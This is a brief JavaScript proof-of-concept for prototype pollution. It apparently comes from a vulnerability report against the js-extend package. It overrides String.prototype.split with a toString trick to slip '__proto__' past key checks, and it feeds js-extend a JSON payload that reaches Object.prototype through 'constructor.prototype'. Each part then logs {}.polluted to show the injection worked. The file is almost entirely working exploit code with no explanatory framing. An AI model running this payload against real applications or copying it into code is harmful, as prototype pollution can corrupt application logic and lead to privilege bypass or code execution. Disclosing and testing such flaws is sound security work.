var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log({}.polluted);